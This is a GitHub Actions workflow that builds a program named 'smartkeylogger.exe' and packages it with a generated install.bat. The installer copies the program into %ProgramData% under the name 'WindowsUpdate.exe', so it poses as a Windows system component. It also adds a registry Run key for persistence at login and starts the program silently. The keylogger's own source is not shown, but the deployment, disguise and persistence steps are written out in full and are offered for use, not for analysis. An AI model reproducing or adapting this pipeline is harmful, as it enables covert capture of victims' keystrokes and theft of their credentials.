name: Build with Installer

on: [push, workflow_dispatch]

jobs:
  build:
    runs-on: windows-latest
    
    steps:
    - uses: actions/checkout@v4
    
    - name: Setup MSVC and OpenSSL
      uses: ilammy/msvc-dev-cmd@v1
      
    - name: Download OpenSSL DLLs
      run: |
        # Download OpenSSL from official source
        $url = "https://github.com/openssl/openssl/releases/download/openssl-3.1.5/openssl-3.1.5.zip"
        Invoke-WebRequest -Uri $url -OutFile openssl.zip
        Expand-Archive openssl.zip -DestinationPath openssl
        
        # Copy required DLLs
        Copy-Item "openssl\bin\libssl-3-x64.dll" .
        Copy-Item "openssl\bin\libcrypto-3-x64.dll" .
        
    - name: Compile
      shell: cmd
      run: |
        :: Compile with OpenSSL
        cl.exe /nologo /O2 /MT /EHsc /std:c++17 ^
               /DWIN32_LEAN_AND_MEAN /D_WINSOCKAPI_ ^
               /I "openssl\include" ^
               main.cpp ^
               /link ^
               /SUBSYSTEM:WINDOWS ^
               /OUT:smartkeylogger.exe ^
               openssl\lib\libssl.lib ^
               openssl\lib\libcrypto.lib ^
               winhttp.lib user32.lib shell32.lib ole32.lib kernel32.lib ^
               gdi32.lib crypt32.lib iphlpapi.lib ws2_32.lib advapi32.lib
        
    - name: Create Installer Package
      run: |
        # Create package directory
        New-Item -ItemType Directory -Force -Path "Package"
        
        # Copy files
        Copy-Item "smartkeylogger.exe" "Package\"
        Copy-Item "libssl-3-x64.dll" "Package\"
        Copy-Item "libcrypto-3-x64.dll" "Package\"
        
        # Create installer scripts
        @"
        @echo off
        echo Installing Smart Keylogger...
        copy smartkeylogger.exe "%ProgramData%\WindowsUpdate\WindowsUpdate.exe"
        copy libssl-3-x64.dll "%ProgramData%\WindowsUpdate\"
        copy libcrypto-3-x64.dll "%ProgramData%\WindowsUpdate\"
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "%ProgramData%\WindowsUpdate\WindowsUpdate.exe" /f
        start "" "%ProgramData%\WindowsUpdate\WindowsUpdate.exe"
        echo Installation complete!
        pause
        "@ | Out-File -FilePath "Package\install.bat" -Encoding ASCII
        
        # Create ZIP
        Compress-Archive -Path "Package\*" -DestinationPath "SmartKeylogger_Installer.zip" -Force
        
    - name: Upload Artifacts
      uses: actions/upload-artifact@v4
      with:
        name: SmartKeylogger-Package
        path: |
          SmartKeylogger_Installer.zip
          smartkeylogger.exe
          *.dll
